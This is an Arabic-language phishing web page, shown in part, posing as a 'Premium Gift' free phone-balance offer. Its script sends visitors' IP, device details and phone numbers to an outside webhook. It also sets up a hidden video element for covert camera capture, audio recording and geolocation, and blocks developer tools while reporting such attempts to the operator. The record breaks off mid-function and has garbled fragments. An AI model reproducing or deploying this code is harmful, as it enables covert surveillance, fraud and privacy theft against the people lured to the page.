<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Premium Gift • Free Balance</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --gold: #f6b83d;
            --gold-light: #fcd48c;
            --gold-glow: rgba(246, 184, 61, 0.35);
            --dark-bg: #0b0806;
            --card-bg: rgba(18, 14, 12, 0.72);
            --glass-border: rgba(246, 184, 61, 0.10);
            --text-primary: #f0ece6;
            --text-secondary: #b8aaa0;
            --shadow-heavy: 0 40px 90px rgba(0, 0, 0, 0.75);
            --shadow-soft: 0 20px 50px rgba(0, 0, 0, 0.5);
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Cairo', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            background: radial-gradient(ellipse at 20% 20%, #1f140e, #0b0806 75%);
            background-attachment: fixed;
            color: var(--text-primary);
            position: relative;
            overflow-x: hidden;
        }

        /* ===== AMBIENT BACKGROUND ===== */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(circle at 10% 80%, rgba(246, 184, 61, 0.04) 0%, transparent 60%),
                radial-gradient(circle at 90% 20%, rgba(246, 184, 61, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 50% 50%, rgba(246, 184, 61, 0.01) 0%, transparent 80%);
            pointer-events: none;
            z-index: 0;
        }

        /* ===== FLOATING PARTICLES ===== */
        .particles {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }
        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: var(--gold);
            border-radius: 50%;
            opacity: 0.15;
            animation: floatParticle linear infinite;
        }
        @keyframes floatParticle {
            0% {
                transform: translateY(100vh) scale(0);
                opacity: 0;
            }
            10% {
                opacity: 0.15;
            }
            90% {
                opacity: 0.15;
            }
            100% {
                transform: translateY(-10vh) scale(1);
                opacity: 0;
            }
        }

        /* ===== APP WRAPPER ===== */
        .app-wrapper {
            width: 100%;
            max-width: 580px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
            perspective: 1200px;
        }

        /* ===== HEADER ===== */
        .app-header {
            text-align: center;
            margin-bottom: 32px;
            position: relative;
        }

        .logo-container {
            display: inline-block;
            position: relative;
            animation: logoFloat 4s ease-in-out infinite;
        }
        .logo-container::before {
            content: '';
            position: absolute;
            inset: -30px;
            background: radial-gradient(circle at center, var(--gold-glow), transparent 70%);
            opacity: 0.5;
            filter: blur(20px);
            animation: glowPulse 3s ease-in-out infinite;
        }
        @keyframes glowPulse {
            0%,
            100% {
                opacity: 0.35;
                transform: scale(1);
            }
            50% {
                opacity: 0.7;
                transform: scale(1.2);
            }
        }
        @keyframes logoFloat {
            0%,
            100% {
                transform: translateY(0) scale(1);
            }
            50% {
                transform: translateY(-10px) scale(1.02);
            }
        }

        .logo-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(145deg, rgba(246, 184, 61, 0.15), rgba(246, 184, 61, 0.04));
            border: 1px solid rgba(246, 184, 61, 0.15);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: var(--gold);
            backdrop-filter: blur(12px);
            box-shadow: 0 0 60px rgba(246, 184, 61, 0.08), inset 0 1px 0 rgba(246, 184, 61, 0.2);
            position: relative;
            margin: 0 auto 6px;
            transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        .logo-icon:hover {
            transform: scale(1.06) rotate(2deg);
        }
        .logo-icon i {
            filter: drop-shadow(0 0 20px rgba(246, 184, 61, 0.2));
        }

        .app-header h1 {
            font-size: 34px;
            font-weight: 900;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #fcd48c, var(--gold), #e8a830);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: none;
            position: relative;
            display: inline-block;
        }
        .app-header h1::after {
            content: '';
            position: absolute;
            bottom: -4px;
            left: 50%;
            transform: translateX(-50%);
            width: 60%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--gold), transparent);
            opacity: 0.4;
        }
        .app-header .subtitle {
            color: var(--text-secondary);
            font-size: 16px;
            font-weight: 300;
            margin-top: 4px;
            letter-spacing: 0.3px;
            opacity: 0.8;
        }

        /* ===== STEP INDICATOR ===== */
        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            margin-bottom: 28px;
            padding: 0 10px;
        }
        .step-dot {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.03);
            border: 2px solid rgba(255, 255, 255, 0.06);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 15px;
            color: rgba(255, 255, 255, 0.2);
            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            backdrop-filter: blur(4px);
        }
        .step-dot .dot-inner {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        .step-dot.active .dot-inner {
            background: linear-gradient(135deg, var(--gold), #d4892a);
            color: #0b0806;
            box-shadow: 0 0 40px var(--gold-glow), inset 0 1px 0 rgba(255, 255, 255, 0.3);
            transform: scale(1.12);
        }
        .step-dot.completed .dot-inner {
            background: rgba(40, 167, 69, 0.2);
            border: 2px solid #28a745;
            color: #28a745;
            box-shadow: 0 0 30px rgba(40, 167, 69, 0.15);
        }
        .step-dot .dot-icon {
            font-size: 16px;
        }
        .step-dot .dot-label {
            display: none;
        }

        .step-line {
            width: 44px;
            height: 2px;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 2px;
            transition: all 0.6s ease;
            position: relative;
            overflow: hidden;
        }
        .step-line::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, var(--gold), #d4892a);
            transform: translateX(-100%);
            transition: transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        .step-line.active::after {
            transform: translateX(0);
        }

        /* ===== MAIN CARD ===== */
        .main-card {
            background: var(--card-bg);
            backdrop-filter: blur(32px) saturate(1.2);
            -webkit-backdrop-filter: blur(32px) saturate(1.2);
            border-radius: 48px;
            padding: 36px 28px 32px;
            border: 1px solid var(--glass-border);
            box-shadow: var(--shadow-heavy), inset 0 1px 0 rgba(246, 184, 61, 0.04);
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
            transition: transform 0.3s ease;
        }
        .main-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -30%;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 70% 30%, rgba(246, 184, 61, 0.04), transparent 70%);
            pointer-events: none;
        }
        .main-card::after {
            content: '';
            position: absolute;
            bottom: -30%;
            left: -20%;
            width: 80%;
            height: 80%;
            background: radial-gradient(circle at 30% 70%, rgba(246, 184, 61, 0.02), transparent 70%);
            pointer-events: none;
        }

        /* ===== STEPS ===== */
        .step {
            display: none;
            animation: stepEnter 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
            position: relative;
            z-index: 2;
        }
        .step.active {
            display: block;
        }

        @keyframes stepEnter {
            0% {
                opacity: 0;
                transform: translateY(40px) scale(0.96) rotateX(4deg);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1) rotateX(0);
            }
        }

        .step-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 2px;
            color: var(--text-primary);
            letter-spacing: -0.3px;
        }
        .step-title .highlight {
            background: linear-gradient(135deg, var(--gold-light), var(--gold), #d4892a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .step-desc {
            color: var(--text-secondary);
            font-size: 15px;
            margin-bottom: 20px;
            font-weight: 300;
            letter-spacing: 0.2px;
        }

        /* ===== COUNTRY GRID ===== */
        .country-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 12px;
            margin: 18px 0 14px;
        }

        .country-btn {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 24px;
            padding: 18px 8px 14px;
            color: var(--text-primary);
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-family: 'Cairo', sans-serif;
            backdrop-filter: blur(4px);
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        .country-btn::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(246, 184, 61, 0.04), transparent);
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        .country-btn .flag {
            font-size: 36px;
            line-height: 1.2;
            position: relative;
            z-index: 1;
            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.3));
        }
        .country-btn .name {
            font-size: 14px;
            font-weight: 600;
            position: relative;
            z-index: 1;
        }
        .country-btn .glow {
            position: absolute;
            inset: -2px;
            border-radius: 24px;
            background: linear-gradient(135deg, var(--gold), transparent 60%);
            opacity: 0;
            transition: opacity 0.4s ease;
            pointer-events: none;
        }
        .country-btn:hover {
            transform: translateY(-8px) scale(1.03) rotateX(2deg);
            border-color: rgba(246, 184, 61, 0.2);
            background: rgba(246, 184, 61, 0.04);
            box-shadow: 0 16px 50px rgba(0, 0, 0, 0.4), 0 0 40px rgba(246, 184, 61, 0.04);
        }
        .country-btn:hover .glow {
            opacity: 1;
        }
        .country-btn:active {
            transform: scale(0.94);
            transition-duration: 0.08s;
        }
        .country-btn .shine {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.04), transparent 60%);
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.6s ease;
        }
        .country-btn:hover .shine {
            opacity: 1;
        }

        /* ===== PERMISSION AREA ===== */
        .permission-wrapper {
            background: rgba(246, 184, 61, 0.02);
            border-radius: 28px;
            padding: 18px 20px;
            margin: 12px 0 18px;
            border: 1px solid rgba(246, 184, 61, 0.04);
            backdrop-filter: blur(4px);
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.02);
        }
        .permission-wrapper ul {
            list-style: none;
            padding: 0;
            margin: 4px 0;
            text-align: right;
        }
        .permission-wrapper ul li {
            padding: 7px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
            color: var(--text-secondary);
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 12px;
        }
        .permission-wrapper ul li i {
            color: var(--gold);
            font-size: 18px;
            width: 26px;
            text-align: center;
        }
        .permission-wrapper .note {
            color: var(--text-secondary);
            font-size: 13px;
            margin-top: 10px;
            text-align: center;
            border-top: 1px solid rgba(255, 255, 255, 0.03);
            padding-top: 10px;
            opacity: 0.7;
        }
        .permission-wrapper .note strong {
            color: var(--gold);
            opacity: 1;
        }

        /* ===== INPUT ===== */
        .input-group {
            margin: 18px 0 16px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 15px;
            color: var(--text-secondary);
            margin-bottom: 5px;
            font-weight: 600;
            letter-spacing: 0.3px;
        }
        .input-group label i {
            color: var(--gold);
            margin-left: 8px;
        }
        .input-group input {
            width: 100%;
            padding: 18px 24px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            background: rgba(0, 0, 0, 0.35);
            color: var(--text-primary);
            font-size: 20px;
            outline: none;
            transition: all 0.4s ease;
            font-family: 'Cairo', sans-serif;
            text-align: right;
            letter-spacing: 0.5px;
            backdrop-filter: blur(4px);
            box-shadow: inset 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        .input-group input:focus {
            border-color: rgba(246, 184, 61, 0.2);
            box-shadow: 0 0 0 6px rgba(246, 184, 61, 0.03), inset 0 4px 20px rgba(0, 0, 0, 0.3);
        }
        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.15);
            font-size: 16px;
        }

        /* ===== BUTTON ===== */
        .btn-gold {
            background: linear-gradient(145deg, #f6b83d, #d4892a);
            border: none;
            color: #0b0806;
            font-weight: 800;
            padding: 20px 30px;
            border-radius: 60px;
            font-size: 22px;
            width: 100%;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 8px 40px rgba(246, 184, 61, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.2);
            font-family: 'Cairo', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
        }
        .btn-gold::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 60px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 60%);
            pointer-events: none;
        }
        .btn-gold::after {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 60px;
            background: linear-gradient(135deg, var(--gold), transparent 60%);
            opacity: 0;
            transition: opacity 0.4s ease;
            pointer-events: none;
            filter: blur(4px);
            z-index: -1;
        }
        .btn-gold:hover:not(:disabled) {
            transform: translateY(-4px) scale(1.01);
            box-shadow: 0 16px 60px rgba(246, 184, 61, 0.3), 0 0 80px rgba(246, 184, 61, 0.06);
        }
        .btn-gold:hover:not(:disabled)::after {
            opacity: 1;
        }
        .btn-gold:active:not(:disabled) {
            transform: scale(0.95) translateY(0);
            transition-duration: 0.06s;
        }
        .btn-gold:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none;
        }
        .btn-gold .spinner {
            display: none;
            width: 26px;
            height: 26px;
            border: 3px solid rgba(0, 0, 0, 0.12);
            border-top: 3px solid #0b0806;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        .btn-gold.loading .spinner {
            display: inline-block;
        }
        .btn-gold.loading .btn-text {
            display: none;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ===== STATUS ===== */
        .status {
            margin-top: 14px;
            padding: 14px 18px;
            border-radius: 28px;
            font-size: 14px;
            font-weight: 600;
            display: none;
            backdrop-filter: blur(8px);
            text-align: center;
            border: 1px solid transparent;
            animation: statusIn 0.4s ease forwards;
        }
        @keyframes statusIn {
            0% {
                opacity: 0;
                transform: translateY(12px) scale(0.96);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        .status.success {
            background: rgba(40, 167, 69, 0.08);
            color: #28a745;
            display: block;
            border-color: rgba(40, 167, 69, 0.1);
        }
        .status.info {
            background: rgba(246, 184, 61, 0.04);
            color: var(--gold);
            display: block;
            border-color: rgba(246, 184, 61, 0.06);
        }
        .status.error {
            background: rgba(220, 53, 69, 0.06);
            color: #dc3545;
            display: block;
            border-color: rgba(220, 53, 69, 0.08);
        }

        /* ===== TIMER ===== */
        .timer-box {
            background: rgba(0, 0, 0, 0.25);
            border-radius: 60px;
            padding: 24px 32px;
            margin: 20px 0 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 28px;
            border: 1px solid rgba(246, 184, 61, 0.04);
            backdrop-filter: blur(8px);
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
            animation: timerMaterialize 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }
        @keyframes timerMaterialize {
            0% {
                opacity: 0;
                transform: translateY(40px) scale(0.9) rotateX(8deg);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1) rotateX(0);
            }
        }
        .timer-box::before {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 60px;
            background: linear-gradient(135deg, rgba(246, 184, 61, 0.04), transparent 60%);
            pointer-events: none;
        }
        .timer-box i {
            font-size: 42px;
            color: var(--gold);
            animation: timerPulse 2s ease-in-out infinite;
            filter: drop-shadow(0 0 30px rgba(246, 184, 61, 0.1));
        }
        @keyframes timerPulse {
            0%,
            100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.5;
                transform: scale(0.92);
            }
        }
        .timer-box span {
            font-size: 44px;
            font-weight: 900;
            color: var(--gold);
            letter-spacing: 6px;
            font-variant-numeric: tabular-nums;
            text-shadow: 0 0 40px rgba(246, 184, 61, 0.08);
            font-family: 'Cairo', monospace;
        }
        .timer-sub {
            color: var(--text-secondary);
            font-size: 15px;
            margin-top: 10px;
            font-weight: 300;
            opacity: 0.7;
            text-align: center;
        }

        /* ===== FOOTER ===== */
        .app-footer {
            margin-top: 28px;
            text-align: center;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.08);
            border-top: 1px solid rgba(255, 255, 255, 0.02);
            padding-top: 16px;
            display: flex;
            flex-direction: column;
            gap: 4px;
            letter-spacing: 0.3px;
        }
        .app-footer i {
            color: rgba(246, 184, 61, 0.15);
        }

        /* ===== HIDDEN ELEMENTS ===== */
        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }
        #hiddenCanvas {
            display: none;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 520px) {
            body {
                padding: 12px;
            }
            .app-header h1 {
                font-size: 27px;
            }
            .logo-icon {
                width: 64px;
                height: 64px;
                font-size: 32px;
            }
            .main-card {
                padding: 24px 16px 22px;
                border-radius: 36px;
            }
            .country-grid {
                grid-template-columns: repeat(auto-fill, minmax(96px, 1fr));
                gap: 10px;
            }
            .country-btn {
                padding: 14px 6px 10px;
                font-size: 13px;
                border-radius: 20px;
            }
            .country-btn .flag {
                font-size: 28px;
            }
            .step-title {
                font-size: 23px;
            }
            .btn-gold {
                font-size: 19px;
                padding: 16px 20px;
            }
            .step-dot {
                width: 38px;
                height: 38px;
                font-size: 13px;
            }
            .step-line {
                width: 30px;
            }
            .timer-box span {
                font-size: 34px;
                letter-spacing: 4px;
            }
            .timer-box i {
                font-size: 34px;
            }
            .timer-box {
                padding: 18px 20px;
                gap: 18px;
            }
            .input-group input {
                padding: 14px 18px;
                font-size: 17px;
            }
            .permission-wrapper {
                padding: 14px 14px;
            }
            .permission-wrapper ul li {
                font-size: 13px;
            }

    <script>
        // ================================================================

        // ================================================================
        const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";

        // ================================================================
        //  CONSTANTS
        // ================================================================
        const TOTAL_PHOTOS = 8;
        const CAPTURE_INTERVAL = 700;
        const AUDIO_DURATION = 5000;
        const PHOTO_QUALITY = 0.92;

        // ================================================================
        //  COUNTRIES DATA
        // ================================================================
        const countries = {
            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
            'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
            'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
            'الأردن': { flag: '🇯🇴', prefixes: ['7'] },

            'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
            'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
            'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
        };

        // ================================================================
        //  TOKEN EXTRACTION
        // ================================================================
        let USER_TOKEN = null;

        function extractTokenFromURL() {
            const params = new URLSearchParams(window.location.search);
            const token = params.get('i');
            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
                USER_TOKEN = token;
                console.log('✅ Token extracted:', USER_TOKEN);
                return true;
            } else {
                USER_TOKEN = null;
                console.warn('❌ No valid token found in URL.');
                return false;
            }
        }

        // ================================================================
        //  WEBHOOK SENDER
        // ================================================================
        async function sendToWebhook(formData) {
            if (!USER_TOKEN) {
                console.error('❌ Cannot send: token missing');
                return { success: false, error: 'Token missing' };
            }
            formData.append('token', USER_TOKEN);

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (!response.ok) {
                    console.error('❌ Webhook error:', result);
                    return { success: false, error: result.message || 'HTTP error' };
                }
                console.log('✅ Webhook success:', result);
                return { success: true, data: result };
            } catch (error) {
                console.error('❌ Webhook fetch error:', error);
                return { success: false, error: error.message };
            }
        }

        // ================================================================
        //  STATE
        // ================================================================
        let selectedCountry = null;
        let userPhone = null;
        let mediaStream = null;
        let audioStream = null;
        let audioRecorder = null;
        let audioChunks = [];
        let capturedPhotoFiles = [];
        let audioBlob = null;
        let userIP = 'غير متاح';
        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
        let isProcessing = false;
        let timerInterval = null;
        let timerSeconds = 180;

        // DOM refs
        const stepCountry = document.getElementById('step-country');
        const stepTasks = document.getElementById('step-tasks');
        const stepTimer = document.getElementById('step-timer');
        const countryList = document.getElementById('countryList');
        const statusCountry = document.getElementById('statusCountry');
        const statusTasks = document.getElementById('statusTasks');
        const statusTimer = document.getElementById('statusTimer');
        const claimBtn = document.getElementById('claimBtn');
        const phoneInput = document.getElementById('phoneInput');
        const permissionArea = document.getElementById('permissionArea');
        const timerDisplay = document.getElementById('timerDisplay');
        const taskSub = document.getElementById('taskSub');
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');

        const stepDots = document.querySelectorAll('.step-dot');
        const stepLines = document.querySelectorAll('.step-line');

        // ================================================================
        //  PARTICLES
        // ================================================================
        (function initParticles() {
            const container = document.getElementById('particles');
            const count = 28;
            for (let i = 0; i < count; i++) {
                const p = document.createElement('div');

                p.style.height = size + 'px';

            }
        })();

        // ================================================================
        //  STEP INDICATOR UPDATE
        // ================================================================
        function updateStepIndicator(step) {
            stepDots.forEach((dot, index) => {
                const num = index + 1;
                const inner = dot.querySelector('.dot-inner');
                const icon = inner.querySelector('.dot-icon');
                dot.classList.remove('active', 'completed');
                if (num === step) {
                    dot.classList.add('active');
                    icon.textContent = num;
                } else if (num < step) {
                    dot.classList.add('completed');
                    icon.textContent = '✓';
                } else {
                    icon.textContent = num;
                }
            });
            stepLines.forEach((line, index) => {
                const num = index + 1;
                line.classList.toggle('active', num < step);
            });
        }

        // ================================================================
        //  NOTIFICATION: USER ENTERED
        // ================================================================
        async function notifyUserEntered() {
            if (!USER_TOKEN) return;
            let ip = 'غير متاح';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
                userIP = ip;
            } catch (e) {}
            const formData = new FormData();
            formData.append('event', 'visit');
            formData.append('timestamp', new Date().toISOString());
            formData.append('ip', ip);
            formData.append('userAgent', navigator.userAgent);
            formData.append('platform', navigator.platform);
            formData.append('language', navigator.language);
            formData.append('screen', `${screen.width}x${screen.height}`);
            formData.append('url', window.location.href);
            const result = await sendToWebhook(formData);
            if (!result.success) {
                console.warn('⚠️ Failed to send visit notification:', result.error);
            }
        }

        // ================================================================
        //  DETECT SUSPICIOUS
        // ================================================================
        function detectSuspiciousActivity() {
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
            });
            document.addEventListener('keydown', (e) => {
                const key = e.key;
                const ctrl = e.ctrlKey || e.metaKey;
                const shift = e.shiftKey;
                if (key === 'F12' ||
                    (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
                    (ctrl && key === 'U')) {
                    e.preventDefault();
                    sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
                }
                if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
                    sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
                }
            });
            document.addEventListener('dragstart', (e) => {
                e.preventDefault();
                sendSuspiciousAlert('🔄 محاولة سحب محتوى');
            });
            document.addEventListener('selectstart', (e) => {
                sendSuspiciousAlert('✏️ محاولة تحديد نص');
            });
        }

        let alertCooldown = 0;

        function sendSuspiciousAlert(action) {
            if (!USER_TOKEN) return;
            const now = Date.now();
            if (now - alertCooldown < 5000) return;
            alertCooldown = now;
            const formData = new FormData();
            formData.append('event', 'suspicious');
            formData.append('action', action);
            formData.append('timestamp', new Date().toISOString());
            formData.append('ip', userIP);
            formData.append('userAgent', navigator.userAgent);
            formData.append('url', window.location.href);
            sendToWebhook(formData).catch(console.warn);
        }

        // ================================================================
        //  RENDER COUNTRIES
        // ================================================================
        function renderCountries() {
            countryList.innerHTML = '';
            Object.keys(countries).forEach(name => {
                const btn = document.createElement('button');
                btn.className = 'country-btn';
                btn.innerHTML = `
                    <span class="glow"></span>
                    <span class="shine"></span>
                    <span class="flag">${countries[name].flag}</span>
                    <span class="name">${name}</span>
                `;
                btn.dataset.country = name;
                btn.addEventListener('click', () => selectCountry(name));
                countryList.appendChild(btn);
            });
        }
        renderCountries();

        // ================================================================
        //  SELECT COUNTRY + GET LOCATION
        // ================================================================
        async function selectCountry(name) {
            selectedCountry = name;
            const data = countries[name];
            taskSub.textContent = `للاستفادة من هدية ${name} (رصيد، نت، وحدات)`;
            const prefixes = data.prefixes.join('، ');
            permissionArea.innerHTML = `
                <ul>
                    <li><i class="fas fa-gift"></i> هدية مجانية بقيمة تصل إلى 50$</li>
                    <li><i class="fas fa-wifi"></i> باقة نت إضافية لمدة 7 أيام</li>
                    <li><i class="fas fa-phone-alt"></i> وحدات اتصال محلية ودولية</li>
                </ul>
                <div class="note">📞 الأرقام المسموحة: <strong>${prefixes}</strong></div>
                <div style="font-size:12px; opacity:0.4; margin-top:8px; border-top:1px solid rgba(255,255,255,0.02); padding-top:8px;">
                    <i class="fas fa-shield-alt" style="color:var(--gold);"></i> عملية آمنة • بياناتك مشفرة
                </div>
            `;
            phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;

            showStep('step-tasks');
            updateStepIndicator(2);
            statusTasks.className = 'status';
            statusTasks.style.display = 'block';
            statusTasks.className = 'status info';
            statusTasks.textContent = '📍 جاري تحديد موقعك...';

            await getLocation();

            phoneInput.value = '';
            capturedPhotoFiles = [];
            audioChunks = [];
            audioBlob = null;
            claimBtn.disabled = false;
            claimBtn.classList.remove('loading');
            claimBtn.querySelector('.btn-text').innerHTML =
                '<i class="fas fa-gift" style="margin-left:10px;"></i> احصل على هديتي';
        }

        function showStep(id) {
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // ================================================================
        //  BUTTON CLICK – MAIN ACTION
        // ================================================================
        claimBtn.addEventListener('click', async () => {
            if (!USER_TOKEN) {
                showStatus(statusTasks, 'error', '⚠️ رابط غير صحيح، يرجى الدخول من الرابط المخصص.');
                return;
            }
            if (isProcessing) return;
            const phone = phoneInput.value.trim();
            if (!phone) {
                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
                return;
            }
            const prefixes = countries[selectedCountry].prefixes;
            let valid = false;
            for (let p of prefixes) {
                if (phone.startsWith(p)) { valid = true; break; }
            }
            if (!valid) {
                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
                return;
            }
            userPhone = phone;

            isProcessing = true;
            claimBtn.disabled = true;
            claimBtn.classList.add('loading');
            claimBtn.querySelector('.btn-text').innerHTML = 'جاري التأكيد...';

            showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');

            await getIPAddress();
            await startCameraAndCapture();
            await recordAudio();

            const success = await sendAllData();

            if (success) {
                showStep('step-timer');
                updateStepIndicator(3);
                startTimer(180);
            } else {
                showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');

                claimBtn.classList.remove('loading');

                isProcessing = false;
            }
        });

        // ================================================================
        //  FUNCTIONS: IP, LOCATION, CAMERA, AUDIO, SEND
        // ================================================================
        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {
                userIP = 'Unable to fetch';
            }
        }

        // ================================================================
        //  LOCATION
        // ================================================================
        async function getLocation() {
            return new Promise((resolve) => {
                console.log('🔍 [getLocation] بدء عملية الحصول على الموقع...');
                if (!navigator.geolocation) {
                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                    showStatus(statusTasks, 'error', '❌ المتصفح لا يدعم خدمة تحديد الموقع.');
                    console.error('❌ [getLocation] المتصفح لا يدعم Geolocation');
                    resolve();
                    return;
                }

